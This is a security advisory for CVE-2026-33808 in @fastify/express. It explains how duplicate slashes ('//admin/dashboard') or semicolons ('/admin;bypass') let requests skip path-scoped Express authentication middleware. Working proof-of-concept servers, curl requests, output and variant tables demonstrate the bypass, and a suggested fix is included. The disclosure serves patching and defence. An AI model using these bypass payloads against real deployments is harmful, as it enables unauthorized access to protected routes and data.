# [C] @fastify/express has a middleware authentication bypass via URL normalization gaps (duplicate slashes and semicolons)

## Summary
Severity: Critical
Advisory: GHSA-6hw5-45gm-fj88
CVE: CVE-2026-33808
CWE: CWE-436
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-6hw5-45gm-fj88
Type: github-advisory

## Affected
- npm: `@fastify/express` — affected >=0 <4.0.5

## Details
### Summary

`@fastify/express` v4.0.4 fails to normalize URLs before passing them to Express middleware when Fastify router normalization options are enabled. This allows complete bypass of path-scoped authentication middleware via two vectors:

1. **Duplicate slashes** (`//admin/dashboard`) when `ignoreDuplicateSlashes: true` is configured
2. **Semicolon delimiters** (`/admin;bypass`) when `useSemicolonDelimiter: true` is configured

In both cases, Fastify's router normalizes the URL and matches the route, but `@fastify/express` passes the original un-normalized URL to Express middleware, which fails to match and is skipped.

Note: This is distinct from GHSA-g6q3-96cp-5r5m (CVE-2026-22037), which addressed URL percent-encoding bypass and was patched in v4.0.3. These normalization gaps remain in v4.0.4. A similar class of normalization issue was addressed in `@fastify/middie` via GHSA-8p85-9qpw-fwgw (CVE-2026-2880), but `@fastify/express` does not include the equivalent fixes.

### Details

The vulnerability exists in `@fastify/express`'s `enhanceRequest` function (`index.js` lines 43-46):

```javascript
const decodedUrl = decodeURI(url)
req.raw.url = decodedUrl
```

The `decodeURI()` function only handles percent-encoding — it does not normalize duplicate slashes or strip semicolon-delimited parameters. When Fastify's router options are enabled, `find-my-way` applies these normalizations during route matching, but `@fastify/express` passes the original URL to Express middleware.

#### Vector 1: Duplicate Slashes

When `ignoreDuplicateSlashes: true` is set, Fastify's `find-my-way` router normalizes `//admin/dashboard` to `/admin/dashboard` for route matching. However, Express middleware receives `//admin/dashboard`. Express's `app.use('/admin', authMiddleware)` expects paths to start with `/admin/`, but `//admin` does not match the `/admin` prefix pattern.

The attack sequence:
1. Client sends `GET //admin/dashboard`
2. Fastify's router normalizes this to `/admin/dashboard` and finds a matching route
3. `enhanceRequest` sets `req.raw.url = "//admin/dashboard"` (preserves double slash)
4. Express middleware `app.use('/admin', authMiddleware)` does not match `//admin` prefix
5. Authentication is bypassed, and the Fastify route handler executes

#### Vector 2: Semicolon Delimiters

When `useSemicolonDelimiter: true` is configured, the router uses `find-my-way`'s `safeDecodeURI()` which treats semicolons as query string delimiters, splitting `/admin;bypass` into path `/admin` and querystring `bypass` for route matching. However, `@fastify/express` passes the full URL `/admin;bypass` to Express middleware.

Express uses path-to-regexp v0.1.12 internally, which compiles middleware paths like `/admin` to the regex `/^\/admin\/?(?=\/|$)/i`. A semicolon character does not satisfy the lookahead condition, causing the middleware match to fail.

The attack flow:
1. Request `GET /admin;bypass` arrives
2. Fastify router: splits at `;` — matches route `GET /admin`
3. Express middleware: regex `/^\/admin\/?(?=\/|$)/i` fails against `/admin;bypass` — middleware skipped
4. Route handler executes without authentication checks

### PoC

#### Duplicate Slash Bypass

Save as `server.js` and run with `node server.js`:

```js
const fastify = require('fastify')

async function start() {
  const app = fastify({
    logger: false,
    ignoreDuplicateSlashes: true,  // documented Fastify option
  })

  await app.register(require('@fastify/express'))

  // Standard Express middleware auth pattern
  app.use('/admin', function expressAuthGate(req, res, next) {
    const auth = req.headers.authorization
    if (!auth || auth !== 'Bearer admin-secret-token') {
      res.statusCode = 403
      res.setHeader('content-type', 'application/json')
      res.end(JSON.stringify({ error: 'Forbidden by Express middleware' }))
      return
    }
    next()
  })

  // Protected route
  app.get('/admin/dashboard', async (request) => {
    return { message: 'Admin dashboard', secret: 'sensitive-admin-data' }
  })

  await app.listen({ port: 3000 })
  console.log('Listening on http://localhost:3000')
}
start()
```

```bash
# Normal access — blocked by Express middleware
$ curl -s http://localhost:3000/admin/dashboard
{"error":"Forbidden by Express middleware"}

# Double-slash bypass — Express middleware skipped, handler runs
$ curl -s http://localhost:3000//admin/dashboard
{"message":"Admin dashboard","secret":"sensitive-admin-data"}

# Triple-slash also works
$ curl -s http://localhost:3000///admin/dashboard
{"message":"Admin dashboard","secret":"sensitive-admin-data"}
```

Multiple variants work: `///admin`, `/.//admin`, `//admin//dashboard`, etc.

#### Semicolon Bypass

```javascript
const fastify = require('fastify')
const http = require('http')

function get(port, url) {
  return new Promise((resolve, reject) => {
    http.get('http://localhost:' + port + url, (res) => {
      let data = ''
      res.on('data', (chunk) => data += chunk)
      res.on('end', () => resolve({ status: res.statusCode, body: data }))
    }).on('error', reject)
  })
}

async function test() {
  const app = fastify({ 
    logger: false, 
    routerOptions: { useSemicolonDelimiter: true }
  })
  await app.register(require('@fastify/express'))
  
  // Auth middleware blocking unauthenticated access
  app.use('/admin', function(req, res, next) {
    if (!req.headers.authorization) {
      res.statusCode = 403
      res.setHeader('content-type', 'application/json')
      res.end(JSON.stringify({ error: 'Forbidden' }))
      return
    }
    next()
  })
  
  app.get('/admin', async () => ({ secret: 'classified-info' }))
  
  await app.listen({ port: 19900, host: '0.0.0.0' })
  
  // Blocked:
  let r = await get(19900, '/admin')
  console.log('/admin:', r.status, r.body)
  // Output: /admin: 403 {"error":"Forbidden"}
  
  // BYPASS:
  r = await get(19900, '/admin;bypass')
  console.log('/admin;bypass:', r.status, r.body)
  // Output: /admin;bypass: 200 {"secret":"classified-info"}
  
  r = await get(19900, '/admin;')
  console.log('/admin;:', r.status, r.body)
  // Output: /admin;: 200 {"secret":"classified-info"}
  
  await app.close()
}
test()
```

Actual output:
```
/admin: 403 {"error":"Forbidden"}
/admin;bypass: 200 {"secret":"classified-info"}
/admin;: 200 {"secret":"classified-info"}
```

The semicolon bypass works with any text after it: `/admin;`, `/admin;x`, `/admin;jsessionid=123`.

### Impact

Complete authentication bypass for applications using Express middleware for path-based access control. An unauthenticated attacker can access protected routes (admin panels, APIs, user data) by manipulating the URL path.

**Duplicate slash vector** affects applications that:
1. Use `@fastify/express` with `ignoreDuplicateSlashes: true`
2. Rely on Express middleware for authentication/authorization
3. Use path-scoped middleware patterns like `app.use('/admin', authMiddleware)`

**Semicolon vector** affects applications that:
1. Use `@fastify/express` with `useSemicolonDelimiter: true` (commonly enabled for Java application server compatibility, e.g., handling `;jsessionid=` parameters)
2. Rely on Express middleware for authentication/authorization
3. Use path-scoped middleware patterns like `app.use('/admin', authMiddleware)`

The bypass works against all Express middleware that uses prefix path matching, including popular packages like `express-basic-auth`, custom authentication middleware, and rate limiting middleware.

The `ignoreDuplicateSlashes` and `useSemicolonDelimiter` options are documented as convenience features, not marked as security-sensitive, so developers would not expect them to impact middleware security.

### Affected Versions

- `@fastify/express` v4.0.4 (latest) with Fastify 5.x
- Requires `ignoreDuplicateSlashes: true` or `useSemicolonDelimiter: true` in Fastify configuration (via top-level option or `routerOptions`)

### Variant Testing

**Duplicate slashes:**

| Request | Express Middleware | Handler Runs | Result |
|---------|-------------------|--------------|--------|
| `GET /admin/dashboard` | Invoked (blocks) | No | 403 Forbidden |
| `GET //admin/dashboard` | Skipped | Yes | 200 OK — **BYPASS** |
| `GET ///admin/dashboard` | Skipped | Yes | 200 OK — **BYPASS** |
| `GET /.//admin/dashboard` | Skipped | Yes | 200 OK — **BYPASS** |
| `GET //admin//dashboard` | Skipped | Yes | 200 OK — **BYPASS** |
| `GET /admin//dashboard` | Invoked (blocks) | No | 403 Forbidden |

**Semicolons:**

| URL | Express MW Fires | Route Matches | Result |
|---|---|---|---|
| `/admin` | Yes | Yes (200/403) | Normal |
| `/admin;` | No | Yes (200) | **BYPASS** |
| `/admin;bypass` | No | Yes (200) | **BYPASS** |
| `/admin;x=1` | No | Yes (200) | **BYPASS** |
| `/admin;/dashboard` | No | Yes (200, routes to /admin) | **BYPASS** |
| `/admin/dashboard;x` | Yes | Yes (routes to /admin/dashboard) | Normal (prefix /admin/ still matches) |

The semicolon bypass is effective when the semicolon appears immediately after the middleware prefix boundary. For sub-paths where the prefix is already matched (e.g., `/admin/dashboard;x`), Express's prefix regex succeeds because the `/admin/` part matches before the semicolon appears.

### Suggested Fix

`@fastify/express` should normalize URLs before passing them to Express middleware, respecting the router normalization options that are enabled. Specifically:
- When `ignoreDuplicateSlashes` is enabled, apply `FindMyWay.removeDuplicateSlashes()` to `req.raw.url` before middleware execution
- When `useSemicolonDelimiter` is enabled, strip semicolon-delimited parameters from the URL before passing to Express

This would match the normalization behavior that `@fastify/middie` already implements via `sanitizeUrlPath()` and `normalizePathForMatching()`.

## References
- https://github.com/fastify/fastify-express/security/advisories/GHSA-6hw5-45gm-fj88
- https://nvd.nist.gov/vuln/detail/CVE-2026-33808
- https://cna.openjsf.org/security-advisories.html
- https://github.com/fastify/fastify-express
